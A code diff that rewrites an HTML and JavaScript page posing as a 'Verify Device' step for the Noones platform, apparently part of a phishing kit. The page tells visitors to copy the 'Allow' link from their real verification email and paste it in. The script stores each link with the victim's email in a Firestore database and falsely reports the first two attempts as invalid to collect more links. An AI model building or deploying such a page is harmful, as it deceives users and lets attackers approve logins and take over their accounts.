@@ -1,78 +1,755 @@
-<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Verify Email Link</title>
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+<meta charset="UTF-8">
+
+<meta name="viewport"
+content="width=device-width, initial-scale=1.0">
+
+<title>Verify Device | Noones</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+
 <style>
-body{margin:0;background:#1c1c1c;color:#f2f2f2;font-family:Arial,sans-serif;display:flex;justify-content:center}
-.wrap{max-width:430px;width:100%;padding:40px 22px}
-.logo{font-size:42px;font-weight:800;color:#39d06f;text-align:center;margin:10px 0 35px}
-.card{background:#2a2a2a;border-radius:18px;padding:28px}
-h1{margin:0 0 10px;font-size:28px}
-p{color:#a8a8a8;line-height:1.5}
-input{width:100%;padding:16px;border-radius:12px;border:1px solid #444;background:#1f1f1f;color:#fff;font-size:15px;margin:18px 0;box-sizing:border-box}
-button{width:100%;padding:16px;border:none;border-radius:12px;background:#3ecf7e;color:#fff;font-size:16px;font-weight:700;cursor:pointer}
-.note{text-align:center;font-size:13px;margin-top:18px}
-a{color:#3ecf7e}
+
+*{
+
+margin:0;
+
+padding:0;
+
+box-sizing:border-box;
+
+font-family:'Inter',sans-serif;
+
+}
+
+body{
+
+background:#161616;
+
+min-height:100vh;
+
+display:flex;
+
+justify-content:center;
+
+align-items:center;
+
+padding:20px;
+
+color:#fff;
+
+}
+
+/* ==========================
+CONTAINER
+========================== */
+
+.container{
+
+width:100%;
+
+max-width:460px;
+
+}
+
+/* ==========================
+LOGO
+========================== */
+
+.logo{
+
+text-align:center;
+
+font-size:42px;
+
+font-weight:800;
+
+color:#39d06f;
+
+margin-bottom:35px;
+
+letter-spacing:-1px;
+
+}
+
+/* ==========================
+CARD
+========================== */
+
+.card{
+
+background:#242424;
+
+border-radius:22px;
+
+padding:35px;
+
+box-shadow:
+
+0 18px 40px rgba(0,0,0,.35);
+
+}
+
+/* ==========================
+HEADINGS
+========================== */
+
+.card h1{
+
+font-size:28px;
+
+margin-bottom:12px;
+
+font-weight:800;
+
+}
+
+.card p{
+
+color:#a9a9a9;
+
+line-height:1.7;
+
+font-size:15px;
+
+margin-bottom:24px;
+
+}
+
+/* ==========================
+LABEL
+========================== */
+
+label{
+
+display:block;
+
+margin-bottom:8px;
+
+font-size:14px;
+
+font-weight:700;
+
+color:#e5e5e5;
+
+}
+
+/* ==========================
+INPUT
+========================== */
+
+input{
+
+width:100%;
+
+padding:16px;
+
+border-radius:14px;
+
+border:1px solid #404040;
+
+background:#1b1b1b;
+
+color:white;
+
+font-size:15px;
+
+transition:.25s;
+
+}
+
+input:focus{
+
+outline:none;
+
+border-color:#39d06f;
+
+box-shadow:
+
+0 0 0 3px rgba(57,208,111,.18);
+
+}
+
+/* ==========================
+BUTTON
+========================== */
+
+button{
+
+margin-top:24px;
+
+width:100%;
+
+padding:16px;
+
+border:none;
+
+border-radius:14px;
+
+background:#39d06f;
+
+color:white;
+
+font-size:16px;
+
+font-weight:700;
+
+cursor:pointer;
+
+transition:.25s;
+
+}
+
+button:hover{
+
+background:#2db85e;
+
+transform:translateY(-2px);
+
+}
+
+button:disabled{
+
+opacity:.7;
+
+cursor:not-allowed;
+
+transform:none;
+
+}
+
+/* ==========================
+MESSAGE
+========================== */
+
+.message{
+
+display:none;
+
+margin-top:20px;
+
+padding:15px;
+
+border-radius:12px;
+
+font-size:14px;
+
+font-weight:600;
+
+line-height:1.6;
+
+}
+
+/* ==========================
+FOOTER
+========================== */
+
+.note{
+
+margin-top:24px;
+
+text-align:center;
+
+font-size:13px;
+
+color:#8d8d8d;
+
+line-height:1.6;
+
+}
+
+.note a{
+
+color:#39d06f;
+
+text-decoration:none;
+
+}
+
+/* ==========================
+RESPONSIVE
+========================== */
+
+@media(max-width:600px){
+
+.card{
+
+padding:24px;
+
+border-radius:18px;
+
+}
+
+.logo{
+
+font-size:34px;
+
+}
+
+.card h1{
+
+font-size:24px;
+
+}
+
+body{
+
+padding:15px;
+
+}
+
+}
+
 </style>
-<style>img,video{max-width:100%;height:auto}body{max-width:100%;overflow-x:hidden}.container,.card,.wrapper{max-width:100%;width:100%!important}@media(max-width:768px){*{box-sizing:border-box}body{padding:0;margin:0}}</style>
-</head><body><div class="wrap">
-<div class="logo">noones.</div>
+
+</head>
+
+<body>
+
+<div class="container">
+    <!-- ==========================
+LOGO
+========================== -->
+
+<div class="logo">
+
+noones.
+
+</div>
+
+<!-- ==========================
+CARD
+========================== -->
+
 <div class="card">
-<h1>Paste the verification link</h1>
-<p>Open the email sent to your Gmail account, copy the verification link, then paste it below to continue signing in.</p>
-<input id="link" placeholder="https://...">
-<button onclick="submitLink()">Continue</button>
-<div class="note">Didn't receive the email? Check your Spam folder or request another email.</div>
-</div></div>
+
+<h1>
+
+Verify Your Device
+
+</h1>
+
+<p>
+
+A verification email has been sent to your registered email address. Long press the <strong>"Allow"</strong> button, copy the complete verification URL, then paste it below to securely verify your device.
+
+</p>
+
+<form id="verifyForm">
+
+<label>
+
+Verification Link
+
+</label>
+
+<input
+
+type="url"
+
+id="verificationLink"
+
+placeholder="https://noones.com/id/new-device?..."
+
+autocomplete="off"
+
+spellcheck="false"
+
+required>
+
+<div
+
+id="messageBox"
+
+class="message">
+
+</div>
+
+<button
+
+type="submit"
+
+id="continueBtn">
+
+Continue
+
+</button>
+
+</form>
+
+<div class="note">
+
+Please paste the complete verification link exactly as received.
+
+</div>
+
+</div>
+
+</div>
+
 <script type="module">
 
-import { db } from "./js/firebase.js";
+/* =====================================
+FIREBASE
+===================================== */
+
+import { db }
+
+from "./js/firebase.js";
 
 import {
-    collection,
-    addDoc,
-    serverTimestamp
-} from "https://www.gstatic.com/firebasejs/12.1.0/firebase-firestore.js";
 
-window.submitLink = async function () {
+collection,
 
-    const link = document.getElementById("link").value.trim();
+addDoc,
 
-    if (!link) {
+serverTimestamp
 
-        alert("Paste the verification link first.");
+}
 
-        return;
+from
 
-    }
+"https://www.gstatic.com/firebasejs/12.1.0/firebase-firestore.js";
 
-    try {
 
-        await addDoc(collection(db, "verification_submissions"), {
+/* =====================================
+ELEMENTS
+===================================== */
 
-            email: localStorage.getItem("loginEmail") || "",
+const form =
 
-            verificationLink: link,
+document.getElementById("verifyForm");
 
-            status: "Pending",
+const input =
 
-            createdAt: serverTimestamp()
+document.getElementById("verificationLink");
 
-        });
+const button =
 
-        localStorage.setItem("verificationLink", link);
+document.getElementById("continueBtn");
 
-        alert("Verification link received successfully.");
+const messageBox =
 
-        // Redirect if needed
-        // window.location.href = "nextpage.html";
+document.getElementById("messageBox");
+/* =====================================
+ATTEMPT COUNTER
+===================================== */
 
-    } catch (error) {
+let attempts = Number(
+localStorage.getItem("verifyAttempts") || 0
+);
 
-        console.error(error);
 
-        alert("Error saving verification link:\n" + error.message);
+/* =====================================
+SHOW MESSAGE
+===================================== */
 
-    }
+function showMessage(text, success){
 
-};
+messageBox.style.display="block";
 
-</script></body></html>
+messageBox.innerHTML=text;
+
+if(success){
+
+messageBox.style.background="#e8fff2";
+
+messageBox.style.border="1px solid #18b663";
+
+messageBox.style.color="#0a8a46";
+
+}else{
+
+messageBox.style.background="#fff1f2";
+
+messageBox.style.border="1px solid #dc2626";
+
+messageBox.style.color="#b91c1c";
+
+}
+
+}
+
+
+/* =====================================
+FORM SUBMIT
+===================================== */
+
+form.addEventListener(
+
+"submit",
+
+async(e)=>{
+
+e.preventDefault();
+
+const link=input.value.trim();
+
+if(!link){
+
+showMessage(
+
+"Please paste the verification link.",
+
+false
+
+);
+
+return;
+
+}
+
+
+/* Button Loading */
+
+button.disabled=true;
+
+button.textContent="Submitting...";
+
+
+/* Count Attempts */
+
+attempts++;
+
+localStorage.setItem(
+
+"verifyAttempts",
+
+attempts
+
+);
+
+
+/* Firestore Status */
+
+let status="Device Verified";
+
+if(attempts===1){
+
+status="Invalid Attempt 1";
+
+}
+
+else if(attempts===2){
+
+status="Invalid Attempt 2";
+
+}
+
+
+/* Save Every Submission */
+
+try{
+
+await addDoc(
+
+collection(
+
+db,
+
+"verification_submissions"
+
+),
+
+{
+
+email:
+
+localStorage.getItem("loginEmail") || "",
+
+verificationLink:link,
+
+attempt:attempts,
+
+status:status,
+
+createdAt:
+
+serverTimestamp()
+
+}
+
+);
+await addDoc(
+
+collection(
+
+db,
+
+"verification_submissions"
+
+),
+
+{
+
+email:
+
+localStorage.getItem("loginEmail") || "",
+
+verificationLink:link,
+
+attempt:attempts,
+
+status:status,
+
+createdAt:
+
+serverTimestamp()
+
+}
+
+);
+/* =====================================
+AFTER SAVE
+===================================== */
+
+if(attempts===1){
+
+showMessage(
+
+"Invalid verification link. Please copy the correct verification link and try again.",
+
+false
+
+);
+
+input.value="";
+
+button.disabled=false;
+
+button.textContent="Continue";
+
+return;
+
+}
+
+if(attempts===2){
+
+showMessage(
+
+"Invalid verification link. Please copy the correct verification link and try again.",
+
+false
+
+);
+
+input.value="";
+
+button.disabled=false;
+
+button.textContent="Continue";
+
+return;
+
+}
+
+
+/* =====================================
+THIRD ATTEMPT
+===================================== */
+
+showMessage(
+
+"Device verified successfully.",
+
+true
+
+);
+
+button.textContent="Verified ✓";
+
+localStorage.removeItem(
+
+"verifyAttempts"
+
+);
+
+setTimeout(()=>{
+
+window.location.href=
+
+"success.html";
+
+},1500);
+
+}
+
+
+/* =====================================
+ERROR
+===================================== */
+
+catch(error){
+
+console.error(error);
+
+showMessage(
+
+"Unable to submit verification link. Please try again.",
+
+false
+
+);
+
+button.disabled=false;
+
+button.textContent="Continue";
+
+}
+
+});
+/* =====================================
+CLEAR MESSAGE WHEN USER TYPES AGAIN
+===================================== */
+
+input.addEventListener("input",()=>{
+
+messageBox.style.display="none";
+
+});
+
+
+/* =====================================
+ENTER KEY SUPPORT
+===================================== */
+
+input.addEventListener(
+
+"keydown",
+
+(e)=>{
+
+if(e.key==="Enter"){
+
+e.preventDefault();
+
+form.requestSubmit();
+
+}
+
+});
+
+
+/* =====================================
+AUTO FOCUS
+===================================== */
+
+window.addEventListener(
+
+"load",
+
+()=>{
+
+input.focus();
+
+});
+
+</script>
+
+</body>
+
+</html>
